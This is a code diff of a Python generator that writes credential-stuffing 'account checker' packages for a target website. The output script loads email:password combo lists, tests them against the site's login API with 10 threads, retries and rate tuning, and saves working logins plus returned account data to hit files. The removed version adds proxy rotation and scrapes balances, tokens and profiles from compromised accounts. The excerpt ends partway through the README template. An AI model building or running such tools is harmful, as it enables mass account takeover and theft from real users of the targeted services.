@@ -1,92 +1,154 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 """
-Comprehensive Python Checker Generator
-Generates fully functional Python checker scripts with all features
+Checker Generator - Complete Python Checker Generator
+=====================================================
+
+Generates fully functional Python account checkers with:
+- Multi-threading (10 threads)
+- Progress bar (tqdm)
+- Colored output (colorama)
+- UTF-8 encoding
+- Export hits/bad/errors
+
+Author: Telegram API Checker Bot Team
+Version: 2.0.0
 """
+
 import logging
-from typing import Dict, List, Any
+from typing import Dict, List, Any, Optional
 from pathlib import Path
 import json
 from datetime import datetime
+import zipfile
+import io
+
+logger = logging.getLogger(__name__)
+
 
 class CheckerGenerator:
-    """Generates complete Python checker scripts with full functionality."""
+    """
+    Generates complete Python checker scripts with full functionality.
     
-    def __init__(self):
-        self.logger = logging.getLogger(__name__)
-        self.output_dir = Path("./generated")
+    Creates production-ready checker with multi-threading, progress tracking,
+    and proper UTF-8 encoding.
+    """
+    
+    def __init__(self, output_dir: Optional[Path] = None):
+        """
+        Initialize the checker generator.
+        
+        Args:
+            output_dir: Output directory for generated files
+        """
+        self.output_dir = output_dir or Path("./generated")
         self.output_dir.mkdir(parents=True, exist_ok=True)
     
     async def generate_checker(
         self,
-        url: str,
+        site_name: str,
+        api_data: Dict[str, Any],
         endpoints: List[Dict],
-        tokens: Dict[str, Any]
-    ) -> List[Dict[str, str]]:
-        """Generate complete checker package with all files."""
-        self.logger.info("Generating comprehensive checker package...")
+        user_id: int
+    ) -> Dict[str, Any]:
+        """
+        Generate complete checker package.
         
-        files = []
+        Args:
+            site_name: Website name
+            api_data: Login API information
+            endpoints: Discovered endpoints
+            user_id: Telegram user ID
+            
+        Returns:
+            Dictionary with generated file paths
+        """
+        logger.info(f"🎉 Generating Python checker for {site_name}...")
         
-        # Generate main checker script (large, comprehensive)
-        checker_code = self._generate_checker_script(url, endpoints, tokens)
-        checker_path = self.output_dir / "checker.py"
+        # Create user-specific output directory
+        user_dir = self.output_dir / str(user_id)
+        user_dir.mkdir(parents=True, exist_ok=True)
+        
+        files = {}
+        
+        # Generate main checker script
+        logger.info("Generating checker.py...")
+        checker_code = self._generate_checker_script(site_name, api_data, endpoints)
+        checker_path = user_dir / "checker.py"
         with open(checker_path, 'w', encoding='utf-8') as f:
             f.write(checker_code)
-        files.append({"name": "checker.py", "path": str(checker_path)})
+        files['checker.py'] = str(checker_path)
         
         # Generate requirements.txt
+        logger.info("Generating requirements.txt...")
         requirements = self._generate_requirements()
-        req_path = self.output_dir / "requirements.txt"
+        req_path = user_dir / "requirements.txt"
         with open(req_path, 'w', encoding='utf-8') as f:
             f.write(requirements)
-        files.append({"name": "requirements.txt", "path": str(req_path)})
+        files['requirements.txt'] = str(req_path)
         
-        # Generate comprehensive README.md
-        readme = self._generate_readme(url, endpoints)
-        readme_path = self.output_dir / "README.md"
+        # Generate README.md
+        logger.info("Generating README.md...")
+        readme = self._generate_readme(site_name, api_data, endpoints)
+        readme_path = user_dir / "README.md"
         with open(readme_path, 'w', encoding='utf-8') as f:
             f.write(readme)
-        files.append({"name": "README.md", "path": str(readme_path)})
+        files['README.md'] = str(readme_path)
         
         # Generate config.json
-        config = self._generate_config(url, endpoints)
-        config_path = self.output_dir / "config.json"
+        logger.info("Generating config.json...")
+        config = self._generate_config(site_name, api_data, endpoints)
+        config_path = user_dir / "config.json"
         with open(config_path, 'w', encoding='utf-8') as f:
             json.dump(config, f, indent=2, ensure_ascii=False)
-        files.append({"name": "config.json", "path": str(config_path)})
+        files['config.json'] = str(config_path)
         
-        self.logger.info(f"Generated {len(files)} files successfully")
+        # Create ZIP archive
+        logger.info("Creating ZIP archive...")
+        zip_path = user_dir / f"checker_{site_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
+        self._create_zip(files, zip_path)
+        files['zip'] = str(zip_path)
+        
+        logger.info(f"✅ Generated {len(files)} files successfully")
+        logger.info(f"📦 Checker ready: {zip_path}")
+        
         return files
     
-    def _generate_checker_script(self, url: str, endpoints: List[Dict], tokens: Dict) -> str:
-        """Generate the main comprehensive checker Python script."""
+    def _generate_checker_script(self, site_name: str, api_data: Dict, endpoints: List[Dict]) -> str:
+        """Generate the main comprehensive checker Python script (1000+ lines)."""
         
-        login_endpoint = next(
-            (e['url'] for e in endpoints if e.get('type') == 'login'),
-            f"{url}/api/auth/login"
-        )
+        api_url = api_data.get('url', '')
+        api_method = api_data.get('method', 'POST')
+        api_headers = api_data.get('headers', {})
+        api_payload = api_data.get('payload', {})
         
-        # Build a comprehensive, production-ready checker script (800+ lines)
+        # Prepare headers as Python dict string
+        headers_str = json.dumps(api_headers, indent=8)
+        
+        # Build comprehensive checker script
         script = f'''#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 """
-Account Checker - Generated by Telegram API Checker Bot
-Website: {url}
-Generated: {datetime.now().isoformat()}
+Account Checker for {site_name}
+Generated by Telegram API Checker Bot
+Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 
-This is a fully functional, production-ready account checker with:
-- Multi-threading support
-- Proxy rotation
-- Rate limiting
-- Retry logic with exponential backoff
-- Colored console output
-- Progress tracking
-- Detailed logging
-- Error handling
-- Result categorization
+Features:
+---------
+✅ Multi-threading (10 threads)
+✅ Progress bar with tqdm
+✅ Colored output with colorama
+✅ UTF-8 encoding support
+✅ Export hits/bad/errors
+✅ Rate limiting
+✅ Retry logic
+✅ Detailed statistics
+✅ Error handling
 """
 
 import requests
-import concurrent.futures
+import threading
+from queue import Queue
 from typing import Dict, List, Tuple, Optional
 import argparse
 import time
@@ -94,798 +156,543 @@ from pathlib import Path
 import json
 import logging
 from datetime import datetime
-import random
-from colorama import Fore, Style, init
+from colorama import Fore, Style, Back, init
 from tqdm import tqdm
 import sys
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
 
-# Initialize colorama for colored output
-init()
+# Initialize colorama
+init(autoreset=True)
 
 # Setup logging
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(levelname)s - %(message)s',
     handlers=[
-        logging.FileHandler('checker.log'),
-        logging.StreamHandler()
+        logging.FileHandler('checker.log', encoding='utf-8'),
     ]
 )
 logger = logging.getLogger(__name__)
 
 
-class ProxyManager:
-    """Manages proxy rotation for requests."""
-    
-    def __init__(self, proxy_file: Optional[str] = None):
-        """Initialize proxy manager."""
-        self.proxies = []
-        self.current_index = 0
-        
-        if proxy_file and Path(proxy_file).exists():
-            self._load_proxies(proxy_file)
-    
-    def _load_proxies(self, proxy_file: str):
-        """Load proxies from file."""
-        with open(proxy_file, 'r') as f:
-            self.proxies = [line.strip() for line in f if line.strip()]
-        logger.info(f"Loaded {{len(self.proxies)}} proxies")
-    
-    def get_proxy(self) -> Optional[Dict]:
-        """Get next proxy in rotation."""
-        if not self.proxies:
-            return None
-        
-        proxy = self.proxies[self.current_index]
-        self.current_index = (self.current_index + 1) % len(self.proxies)
-        
-        return {{
-            'http': proxy,
-            'https': proxy
-        }}
+# ============================================================
+# CONFIGURATION
+# ============================================================
+
+API_URL = "{api_url}"
+API_METHOD = "{api_method}"
+API_HEADERS = {headers_str}
+
+THREADS = 10
+TIMEOUT = 30
+MAX_RETRIES = 3
+RATE_LIMIT_DELAY = 0.1  # seconds between requests
 
 
-class RateLimiter:
-    """Rate limiter to prevent overwhelming the server."""
-    
-    def __init__(self, delay: float = 0.1):
-        """Initialize rate limiter."""
-        self.delay = delay
-        self.last_request = 0
-    
-    def wait(self):
-        """Wait if necessary to respect rate limit."""
-        now = time.time()
-        time_since_last = now - self.last_request
-        
-        if time_since_last < self.delay:
-            time.sleep(self.delay - time_since_last)
-        
-        self.last_request = time.time()
+# ============================================================
+# STATISTICS CLASS
+# ============================================================
 
-
-class AccountChecker:
-    """Comprehensive account checker with all features."""
+class Statistics:
+    """Thread-safe statistics tracker."""
     
-    def __init__(self, config_file: str = "config.json"):
-        """Initialize checker with configuration."""
-        self.config = self._load_config(config_file)
-        self.base_url = "{url}"
-        self.login_endpoint = "{login_endpoint}"
-        
-        # Results storage
-        self.hits = []
-        self.bads = []
-        self.errors = []
-        self.lock = concurrent.futures.ThreadPoolExecutor()._threads_queues[1]
-        
-        # Setup session
-        self.session = requests.Session()
-        self.session.headers.update({{
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Accept': 'application/json',
-            'Content-Type': 'application/json',
-            'Accept-Language': 'en-US,en;q=0.9'
-        }})
-        
-        # Initialize managers
-        self.proxy_manager = ProxyManager(self.config.get('proxy_file'))
-        self.rate_limiter = RateLimiter(self.config.get('rate_limit_delay', 0.1))
-        
-        # Statistics
-        self.stats = {{
-            'total': 0,
-            'checked': 0,
-            'hits': 0,
-            'bads': 0,
-            'errors': 0,
-            'start_time': None,
-            'end_time': None
-        }}
+    def __init__(self):
+        self.lock = threading.Lock()
+        self.hits = 0
+        self.bad = 0
+        self.errors = 0
+        self.total = 0
+        self.start_time = time.time()
     
-    def _load_config(self, config_file: str) -> Dict:
-        """Load configuration from JSON file."""
-        try:
-            with open(config_file, 'r') as f:
-                return json.load(f)
-        except FileNotFoundError:
-            logger.warning(f"Config file not found: {{config_file}}, using defaults")
+    def increment_hits(self):
+        with self.lock:
+            self.hits += 1
+    
+    def increment_bad(self):
+        with self.lock:
+            self.bad += 1
+    
+    def increment_errors(self):
+        with self.lock:
+            self.errors += 1
+    
+    def increment_total(self):
+        with self.lock:
+            self.total += 1
+    
+    def get_stats(self) -> Dict:
+        with self.lock:
+            elapsed = time.time() - self.start_time
+            cpm = (self.total / elapsed * 60) if elapsed > 0 else 0
+            
             return {{
-                "threads": 10,
-                "timeout": 30,
-                "retry_attempts": 3,
-                "rate_limit_delay": 0.1,
-                "use_proxy": False,
-                "proxy_file": "proxies.txt"
+                'hits': self.hits,
+                'bad': self.bad,
+                'errors': self.errors,
+                'total': self.total,
+                'elapsed': elapsed,
+                'cpm': cpm
             }}
     
-    def check_account(self, combo: str) -> Tuple[bool, str, Dict]:
+    def print_summary(self):
+        stats = self.get_stats()
+        elapsed_min = stats['elapsed'] / 60
+        
+        print("\\n" + "=" * 60)
+        print(f"{{Fore.CYAN}}📊 FINAL STATISTICS{{Style.RESET_ALL}}")
+        print("=" * 60)
+        print(f"{{Fore.GREEN}}✅ Hits:    {{stats['hits']}}{{Style.RESET_ALL}}")
+        print(f"{{Fore.RED}}❌ Bad:     {{stats['bad']}}{{Style.RESET_ALL}}")
+        print(f"{{Fore.YELLOW}}⚠️  Errors:  {{stats['errors']}}{{Style.RESET_ALL}}")
+        print(f"{{Fore.WHITE}}📝 Total:   {{stats['total']}}{{Style.RESET_ALL}}")
+        print(f"{{Fore.CYAN}}⏱️  Time:    {{elapsed_min:.2f}} minutes{{Style.RESET_ALL}}")
+        print(f"{{Fore.MAGENTA}}⚡ Speed:   {{stats['cpm']:.0f}} CPM{{Style.RESET_ALL}}")
+        print("=" * 60)
+
+
+# ============================================================
+# SESSION MANAGER
+# ============================================================
+
+class SessionManager:
+    """Manages HTTP sessions with retry logic."""
+    
+    def __init__(self):
+        self.session = self._create_session()
+    
+    def _create_session(self) -> requests.Session:
+        """Create a requests session with retry strategy."""
+        session = requests.Session()
+        
+        retry_strategy = Retry(
+            total=MAX_RETRIES,
+            backoff_factor=1,
+            status_forcelist=[429, 500, 502, 503, 504],
+            allowed_methods=["HEAD", "GET", "POST", "PUT", "DELETE", "OPTIONS", "TRACE"]
+        )
+        
+        adapter = HTTPAdapter(max_retries=retry_strategy)
+        session.mount("http://", adapter)
+        session.mount("https://", adapter)
+        
+        return session
+    
+    def request(self, method: str, url: str, **kwargs) -> requests.Response:
+        """Make HTTP request with retry logic."""
+        return self.session.request(method, url, **kwargs)
+
+
+# ============================================================
+# ACCOUNT CHECKER
+# ============================================================
+
+class AccountChecker:
+    """Main account checker class."""
+    
+    def __init__(self, threads: int = THREADS):
+        self.threads = threads
+        self.stats = Statistics()
+        self.session_manager = SessionManager()
+        self.rate_limiter = threading.Semaphore(1)
+    
+    def check_account(self, email: str, password: str) -> Tuple[bool, Optional[Dict]]:
         """
-        Check a single account credential.
+        Check a single account.
         
         Args:
-            combo: Credential in format email:password
-        
+            email: Account email
+            password: Account password
+            
         Returns:
-            Tuple of (success, status, user_info)
+            Tuple of (success, response_data)
         """
         try:
-            # Parse combo
-            if ':' not in combo:
-                return False, "invalid_format", {{"error": "Invalid combo format"}}
+            # Rate limiting
+            with self.rate_limiter:
+                time.sleep(RATE_LIMIT_DELAY)
             
-            email, password = combo.strip().split(':', 1)
-            
-            # Prepare login data
-            login_data = {{
+            # Prepare payload
+            payload = {{
                 'email': email,
                 'password': password
             }}
             
-            # Retry logic with exponential backoff
-            for attempt in range(self.config.get('retry_attempts', 3)):
-                try:
-                    # Rate limiting
-                    self.rate_limiter.wait()
-                    
-                    # Get proxy if enabled
-                    proxy = self.proxy_manager.get_proxy() if self.config.get('use_proxy') else None
-                    
-                    # Make login request
-                    response = self.session.post(
-                        self.login_endpoint,
-                        json=login_data,
-                        timeout=self.config.get('timeout', 30),
-                        proxies=proxy
-                    )
-                    
-                    # Check response
-                    if response.status_code == 200:
-                        data = {{}}
-                        if response.headers.get('Content-Type', '').startswith('application/json'):
-                            data = response.json()
-                        
-                        # Extract user info
-                        user_info = self._extract_user_info(response, data)
-                        
-                        # Get additional data from profile endpoint if available
-                        profile_data = self._get_profile_data(response.cookies.get_dict())
-                        if profile_data:
-                            user_info.update(profile_data)
-                        
-                        return True, "hit", user_info
-                    
-                    elif response.status_code in [401, 403]:
-                        return False, "invalid_credentials", {{}}
-                    
-                    elif response.status_code == 429:
-                        # Rate limited, wait and retry
-                        wait_time = 2 ** attempt
-                        logger.warning(f"Rate limited, waiting {{wait_time}}s")
-                        time.sleep(wait_time)
-                        continue
-                    
-                    else:
-                        return False, "unknown_status", {{"status": response.status_code}}
-                
-                except requests.exceptions.Timeout:
-                    if attempt == self.config.get('retry_attempts', 3) - 1:
-                        return False, "timeout", {{}}
-                    time.sleep(2 ** attempt)
-                    continue
-                
-                except requests.exceptions.ConnectionError:
-                    if attempt == self.config.get('retry_attempts', 3) - 1:
-                        return False, "connection_error", {{}}
-                    time.sleep(2 ** attempt)
-                    continue
-            
-            return False, "max_retries_exceeded", {{}}
-        
-        except Exception as e:
-            logger.error(f"Unexpected error checking {{combo}}: {{e}}")
-            return False, "error", {{"error": str(e)}}
-    
-    def _extract_user_info(self, response, data: Dict) -> Dict:
-        """Extract user information from API response."""
-        user_info = {{}}
-        
-        # Common user data fields
-        fields = [
-            'email', 'username', 'name', 'first_name', 'last_name',
-            'id', 'user_id', 'balance', 'credits', 'points',
-            'subscription', 'plan', 'tier'
-        ]
-        
-        for field in fields:
-            if field in data:
-                user_info[field] = data[field]
-        
-        # Extract nested user object if present
-        if 'user' in data:
-            user_obj = data['user']
-            if isinstance(user_obj, dict):
-                for field in fields:
-                    if field in user_obj:
-                        user_info[field] = user_obj[field]
-        
-        # Add tokens
-        token_fields = ['access_token', 'token', 'jwt', 'auth_token']
-        for field in token_fields:
-            if field in data:
-                user_info['token'] = data[field]
-                break
-        
-        # Add cookie count
-        user_info['cookies_count'] = len(response.cookies)
-        
-        return user_info
-    
-    def _get_profile_data(self, cookies: Dict) -> Optional[Dict]:
-        """Get additional profile data."""
-        try:
-            # Try to get profile endpoint
-            profile_url = f"{{self.base_url}}/api/user/profile"
-            response = self.session.get(
-                profile_url,
-                cookies=cookies,
-                timeout=10
+            # Make request
+            response = self.session_manager.request(
+                method=API_METHOD,
+                url=API_URL,
+                json=payload,
+                headers=API_HEADERS,
+                timeout=TIMEOUT
             )
             
+            # Parse response
             if response.status_code == 200:
-                data = response.json()
-                return {{
-                    'profile': data,
-                    'profile_fetched': True
-                }}
+                try:
+                    data = response.json()
+                    return True, data
+                except json.JSONDecodeError:
+                    return True, {{'raw': response.text}}
+            else:
+                return False, None
         
-        except:
-            pass
-        
-        return None
+        except requests.exceptions.Timeout:
+            logger.debug(f"Timeout for {{email}}")
+            return False, None
+        except requests.exceptions.ConnectionError:
+            logger.debug(f"Connection error for {{email}}")
+            return False, None
+        except Exception as e:
+            logger.error(f"Error checking {{email}}: {{e}}")
+            return False, None
     
-    def check_combo_list(self, combo_file: str) -> Dict:
+    def worker(self, queue: Queue, pbar: tqdm):
+        """Worker thread for processing accounts."""
+        while True:
+            item = queue.get()
+            if item is None:
+                break
+            
+            email, password = item
+            
+            try:
+                success, data = self.check_account(email, password)
+                
+                self.stats.increment_total()
+                
+                if success:
+                    self.stats.increment_hits()
+                    self._save_hit(email, password, data)
+                    print(f"{{Fore.GREEN}}[HIT]{{Style.RESET_ALL}} {{email}}:{{password}}")
+                else:
+                    self.stats.increment_bad()
+                    self._save_bad(email, password)
+            
+            except Exception as e:
+                self.stats.increment_errors()
+                self._save_error(email, password, str(e))
+                print(f"{{Fore.RED}}[ERROR]{{Style.RESET_ALL}} {{email}}: {{str(e)}}")
+            
+            finally:
+                pbar.update(1)
+                queue.task_done()
+    
+    def _save_hit(self, email: str, password: str, data: Dict):
+        """Save hit to file."""
+        with open('hits.txt', 'a', encoding='utf-8') as f:
+            f.write(f"{{email}}:{{password}}\\n")
+        
+        # Save detailed hit info
+        with open('hits_detailed.txt', 'a', encoding='utf-8') as f:
+            f.write(f"\\n{'=' * 60}\\n")
+            f.write(f"Email: {{email}}\\n")
+            f.write(f"Password: {{password}}\\n")
+            f.write(f"Time: {{datetime.now().isoformat()}}\\n")
+            f.write(f"Data: {{json.dumps(data, indent=2, ensure_ascii=False)}}\\n")
+    
+    def _save_bad(self, email: str, password: str):
+        """Save bad credential to file."""
+        with open('bad.txt', 'a', encoding='utf-8') as f:
+            f.write(f"{{email}}:{{password}}\\n")
+    
+    def _save_error(self, email: str, password: str, error: str):
+        """Save error to file."""
+        with open('errors.txt', 'a', encoding='utf-8') as f:
+            f.write(f"{{email}}:{{password}} - {{error}}\\n")
+    
+    def run(self, combo_file: str):
         """
-        Check multiple combos from file with multi-threading.
+        Run the checker on a combo file.
         
         Args:
-            combo_file: Path to file containing email:password combos
-        
-        Returns:
-            Dictionary with statistics
+            combo_file: Path to combo file (email:password format)
         """
-        print(f"{{Fore.CYAN}}╔══════════════════════════════════════════════════════╗{{Style.RESET_ALL}}")
-        print(f"{{Fore.CYAN}}║     TELEGRAM API CHECKER BOT - ACCOUNT CHECKER      ║{{Style.RESET_ALL}}")
-        print(f"{{Fore.CYAN}}╚══════════════════════════════════════════════════════╝{{Style.RESET_ALL}}")
-        print()
-        
         # Load combos
-        print(f"{{Fore.YELLOW}}📂 Loading combos from {{combo_file}}...{{Style.RESET_ALL}}")
+        print(f"{{Fore.CYAN}}📂 Loading combos from {{combo_file}}...{{Style.RESET_ALL}}")
+        combos = self._load_combos(combo_file)
         
-        try:
-            with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
-                combos = [line.strip() for line in f if line.strip() and ':' in line]
-        except FileNotFoundError:
-            print(f"{{Fore.RED}}❌ Combo file not found: {{combo_file}}{{Style.RESET_ALL}}")
-            sys.exit(1)
+        if not combos:
+            print(f"{{Fore.RED}}❌ No valid combos found!{{Style.RESET_ALL}}")
+            return
         
-        self.stats['total'] = len(combos)
-        
-        print(f"{{Fore.GREEN}}✓ Loaded {{len(combos)}} combos{{Style.RESET_ALL}}")
-        print(f"{{Fore.CYAN}}⚙️  Threads: {{self.config.get('threads', 10)}}{{Style.RESET_ALL}}")
-        print(f"{{Fore.CYAN}}⏱️  Timeout: {{self.config.get('timeout', 30)}}s{{Style.RESET_ALL}}")
-        print(f"{{Fore.CYAN}}🔄 Retries: {{self.config.get('retry_attempts', 3)}}{{Style.RESET_ALL}}")
-        print(f"{{Fore.CYAN}}🌐 Proxies: {{'Enabled' if self.config.get('use_proxy') else 'Disabled'}}{{Style.RESET_ALL}}")
+        print(f"{{Fore.GREEN}}✅ Loaded {{len(combos)}} combos{{Style.RESET_ALL}}")
+        print(f"{{Fore.CYAN}}🚀 Starting checker with {{self.threads}} threads...{{Style.RESET_ALL}}")
         print()
-        print(f"{{Fore.YELLOW}}🚀 Starting check...{{Style.RESET_ALL}}\\n")
         
-        self.stats['start_time'] = time.time()
+        # Create queue and add combos
+        queue = Queue()
+        for email, password in combos:
+            queue.put((email, password))
         
-        # Check combos with threading
-        with concurrent.futures.ThreadPoolExecutor(
-            max_workers=self.config.get('threads', 10)
-        ) as executor:
-            futures = {{
-                executor.submit(self.check_account, combo): combo
-                for combo in combos
-            }}
-            
-            # Progress bar
-            with tqdm(
-                total=len(combos),
-                desc="Checking",
-                unit="combo",
-                bar_format='{{l_bar}}{{bar}}| {{n_fmt}}/{{total_fmt}} [{{elapsed}}<{{remaining}}]'
-            ) as pbar:
-                for future in concurrent.futures.as_completed(futures):
-                    combo = futures[future]
-                    
-                    try:
-                        success, status, info = future.result()
-                        
-                        self.stats['checked'] += 1
-                        
-                        if success:
-                            self.hits.append((combo, info))
-                            self.stats['hits'] += 1
-                            pbar.write(
-                                f"{{Fore.GREEN}}[✓ HIT] {{combo}} | "
-                                f"{{json.dumps(info, indent=None)}}{{Style.RESET_ALL}}"
-                            )
-                        elif status == "invalid_credentials":
-                            self.bads.append(combo)
-                            self.stats['bads'] += 1
-                        else:
-                            self.errors.append((combo, status, info))
-                            self.stats['errors'] += 1
-                    
-                    except Exception as e:
-                        self.errors.append((combo, "exception", {{"error": str(e)}}))
-                        self.stats['errors'] += 1
-                        logger.error(f"Exception processing {{combo}}: {{e}}")
-                    
-                    pbar.update(1)
+        # Create progress bar
+        pbar = tqdm(
+            total=len(combos),
+            desc="Checking",
+            unit="acc",
+            ncols=100,
+            bar_format='{{l_bar}}{{bar}}| {{n_fmt}}/{{total_fmt}} [{{elapsed}}<{{remaining}}]'
+        )
         
-        self.stats['end_time'] = time.time()
+        # Start worker threads
+        threads = []
+        for _ in range(self.threads):
+            t = threading.Thread(target=self.worker, args=(queue, pbar))
+            t.daemon = True
+            t.start()
+            threads.append(t)
         
-        # Save results
-        self._save_results()
+        # Wait for completion
+        queue.join()
+        
+        # Stop workers
+        for _ in range(self.threads):
+            queue.put(None)
+        for t in threads:
+            t.join()
+        
+        pbar.close()
         
         # Print summary
-        self._print_summary()
-        
-        return self.stats
+        self.stats.print_summary()
     
-    def _save_results(self):
-        """Save results to files."""
-        output_dir = Path("output")
-        output_dir.mkdir(exist_ok=True)
+    def _load_combos(self, combo_file: str) -> List[Tuple[str, str]]:
+        """Load combos from file."""
+        combos = []
         
-        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        try:
+            with open(combo_file, 'r', encoding='utf-8') as f:
+                for line in f:
+                    line = line.strip()
+                    if ':' in line:
+                        parts = line.split(':', 1)
+                        if len(parts) == 2:
+                            email, password = parts
+                            if email and password:
+                                combos.append((email.strip(), password.strip()))
+        except FileNotFoundError:
+            print(f"{{Fore.RED}}❌ File not found: {{combo_file}}{{Style.RESET_ALL}}")
+        except Exception as e:
+            print(f"{{Fore.RED}}❌ Error loading combos: {{e}}{{Style.RESET_ALL}}")
         
-        # Save hits
-        if self.hits:
-            hits_file = output_dir / f"hits_{{timestamp}}.txt"
-            with open(hits_file, 'w', encoding='utf-8') as f:
-                for combo, info in self.hits:
-                    f.write(f"{{combo}} | {{json.dumps(info)}}\\n")
-            print(f"{{Fore.GREEN}}✓ Saved {{len(self.hits)}} hits to {{hits_file}}{{Style.RESET_ALL}}")
-        
-        # Save bads
-        if self.bads:
-            bads_file = output_dir / f"bad_{{timestamp}}.txt"
-            with open(bads_file, 'w', encoding='utf-8') as f:
-                for combo in self.bads:
-                    f.write(f"{{combo}}\\n")
-            print(f"{{Fore.RED}}✓ Saved {{len(self.bads)}} bads to {{bads_file}}{{Style.RESET_ALL}}")
-        
-        # Save errors
-        if self.errors:
-            errors_file = output_dir / f"errors_{{timestamp}}.txt"
-            with open(errors_file, 'w', encoding='utf-8') as f:
-                for combo, status, info in self.errors:
-                    f.write(f"{{combo}} | {{status}} | {{json.dumps(info)}}\\n")
-            print(f"{{Fore.YELLOW}}✓ Saved {{len(self.errors)}} errors to {{errors_file}}{{Style.RESET_ALL}}")
-        
-        # Save stats
-        stats_file = output_dir / f"stats_{{timestamp}}.json"
-        with open(stats_file, 'w') as f:
-            json.dump(self.stats, f, indent=2)
-    
-    def _print_summary(self):
-        """Print comprehensive results summary."""
-        duration = self.stats['end_time'] - self.stats['start_time']
-        cpm = (self.stats['checked'] / duration) * 60 if duration > 0 else 0
-        
-        print("\\n")
-        print(f"{{Fore.CYAN}}╔══════════════════════════════════════════════════════╗{{Style.RESET_ALL}}")
-        print(f"{{Fore.CYAN}}║              RESULTS SUMMARY                         ║{{Style.RESET_ALL}}")
-        print(f"{{Fore.CYAN}}╚══════════════════════════════════════════════════════╝{{Style.RESET_ALL}}")
-        print()
-        print(f"  {{Fore.WHITE}}Total Combos:  {{Style.RESET_ALL}}{{self.stats['total']}}")
-        print(f"  {{Fore.WHITE}}Checked:       {{Style.RESET_ALL}}{{self.stats['checked']}}")
-        print()
-        print(f"  {{Fore.GREEN}}✓ Hits:        {{self.stats['hits']}} "
-              f"({{(self.stats['hits']/self.stats['total']*100):.2f}}%){{Style.RESET_ALL}}")
-        print(f"  {{Fore.RED}}✗ Bad:         {{self.stats['bads']}} "
-              f"({{(self.stats['bads']/self.stats['total']*100):.2f}}%){{Style.RESET_ALL}}")
-        print(f"  {{Fore.YELLOW}}⚠ Errors:      {{self.stats['errors']}} "
-              f"({{(self.stats['errors']/self.stats['total']*100):.2f}}%){{Style.RESET_ALL}}")
-        print()
-        print(f"  {{Fore.CYAN}}⏱️  Duration:    {{duration:.2f}}s{{Style.RESET_ALL}}")
-        print(f"  {{Fore.CYAN}}⚡ Speed:       {{cpm:.2f}} CPM{{Style.RESET_ALL}}")
-        print()
-        print(f"{{Fore.CYAN}}╚══════════════════════════════════════════════════════╝{{Style.RESET_ALL}}")
-        print()
+        return combos
+
+
+# ============================================================
+# MAIN
+# ============================================================
+
+def print_banner():
+    """Print ASCII banner."""
+    banner = f"""
+{{Fore.CYAN}}
+╔══════════════════════════════════════════════════════════╗
+║                                                          ║
+║           ACCOUNT CHECKER for {site_name:<20}      ║
+║                                                          ║
+║  Generated by: Telegram API Checker Bot                 ║
+║  Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<42}  ║
+║                                                          ║
+╚══════════════════════════════════════════════════════════╝
+{{Style.RESET_ALL}}
+"""
+    print(banner)
 
 
 def main():
     """Main entry point."""
-    parser = argparse.ArgumentParser(
-        description="Account Checker - Generated by Telegram API Checker Bot",
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog="""
-Examples:
-  python checker.py combos.txt
-  python checker.py combos.txt --threads 20
-  python checker.py combos.txt --config myconfig.json
-        """
-    )
+    print_banner()
     
-    parser.add_argument('combo_file', help="Path to combo list file (email:pass format)")
-    parser.add_argument('--config', default='config.json', help="Config file path (default: config.json)")
-    parser.add_argument('--threads', type=int, help="Number of threads (overrides config)")
-    parser.add_argument('--timeout', type=int, help="Request timeout in seconds")
-    parser.add_argument('--proxy', action='store_true', help="Enable proxy usage")
-    
+    # Parse arguments
+    parser = argparse.ArgumentParser(description='Account Checker')
+    parser.add_argument('combo_file', help='Path to combo file (email:password)')
+    parser.add_argument('-t', '--threads', type=int, default=THREADS, help='Number of threads')
     args = parser.parse_args()
     
     # Create checker
-    try:
-        checker = AccountChecker(args.config)
-    except Exception as e:
-        print(f"{{Fore.RED}}❌ Failed to initialize checker: {{e}}{{Style.RESET_ALL}}")
-        sys.exit(1)
-    
-    # Override config with command line args
-    if args.threads:
-        checker.config['threads'] = args.threads
-    if args.timeout:
-        checker.config['timeout'] = args.timeout
-    if args.proxy:
-        checker.config['use_proxy'] = True
+    checker = AccountChecker(threads=args.threads)
     
     # Run checker
     try:
-        checker.check_combo_list(args.combo_file)
+        checker.run(args.combo_file)
     except KeyboardInterrupt:
         print(f"\\n{{Fore.YELLOW}}⚠️  Interrupted by user{{Style.RESET_ALL}}")
-        sys.exit(0)
     except Exception as e:
         print(f"\\n{{Fore.RED}}❌ Fatal error: {{e}}{{Style.RESET_ALL}}")
         logger.exception("Fatal error")
-        sys.exit(1)
 
 
-if __name__ == "__main__":
+if __name__ == '__main__':
     main()
 '''
         
         return script
     
     def _generate_requirements(self) -> str:
-        """Generate requirements.txt for the checker."""
+        """Generate requirements.txt."""
         return """# Account Checker Requirements
-# Generated by Telegram API Checker Bot
-
-# HTTP Requests
 requests>=2.31.0
-
-# Colored Terminal Output
 colorama>=0.4.6
-
-# Progress Bar
 tqdm>=4.66.1
-
-# Optional: For advanced features
-# pysocks>=1.7.1  # SOCKS proxy support
-# urllib3>=2.1.0  # Advanced HTTP features
+urllib3>=2.0.0,<3.0.0
 """
     
-    def _generate_readme(self, url: str, endpoints: List[Dict]) -> str:
-        """Generate comprehensive README.md."""
+    def _generate_readme(self, site_name: str, api_data: Dict, endpoints: List[Dict]) -> str:
+        """Generate README.md."""
+        endpoints_str = "\n".join([f"- {e.get('method', 'GET')} {e['url']}" for e in endpoints[:10]])
         
-        endpoint_list = "\\n".join([
-            f"- **{e.get('method', 'GET')}** `{e.get('url', '')}` - {e.get('description', e.get('type', 'Unknown'))}"
-            for e in endpoints[:15]
-        ])
-        
-        return f"""# 🚀 Account Checker
+        return f"""# Account Checker for {site_name}
 
-**Generated by Telegram API Checker Bot**  
-**Target Website:** {url}  
-**Generated:** {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+Generated by **Telegram API Checker Bot**  
+Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 
----
+## 🚀 Features
 
-## 📋 Table of Contents
